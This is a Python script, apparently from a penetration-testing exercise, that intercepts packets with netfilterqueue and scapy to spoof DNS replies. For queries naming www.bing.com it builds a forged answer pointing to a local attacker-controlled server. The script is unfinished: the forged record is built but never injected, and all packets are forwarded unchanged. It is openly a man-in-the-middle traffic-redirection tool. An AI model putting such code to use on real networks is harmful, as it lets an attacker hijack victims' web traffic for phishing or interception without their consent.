#!/usr/bin/env python

import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNSQR

def process_packet(packet):
    # Convert the packet to a scapy packet
    scapy_packet = IP(packet.get_payload())
    # Print the show of this packet
    # Use the haslayer method to check for DNS Response in packet
    if scapy_packet.haslayer(DNSRR):
    # Access the Q Name, we only want to redirect traffic for a specific website, bing.com
    # This will be in the layer name [ DNS Question Record ]
        qname = scapy_packet[DNSQR].qname
        # Decode bytes to a string in order to run if statement
        qname_str = qname.decode('utf-8')
        if "www.bing.com" in qname_str:
            print("[+] Spoofing Target is in: " + qname_str)
            # Specify the DNS Response (DNSRR) to redirect the User somewhere else #
            # rrname is the same, www.bing.com
            # rdata gives the IP of the webserver hosted on my Kali machine
            # This is where we want to redirect our user to
            answer = DNSRR(rrname=qname, rdata="192.168.63.139")




    # print(scapy_packet.show())
    # forward trapped packets to their destination
    packet.accept()

# Create an Instance "queue" of the netfilterqueue object
queue = netfilterqueue.NetfilterQueue()
# Invoke a method .bind() on the Object Instance we created
# Connect/bind the object to the queue "0".
# Assign a callback function "process_packet" to be executed on each packet trapped in queue "0".
queue.bind(0, process_packet)
# Run the queue
queue.run()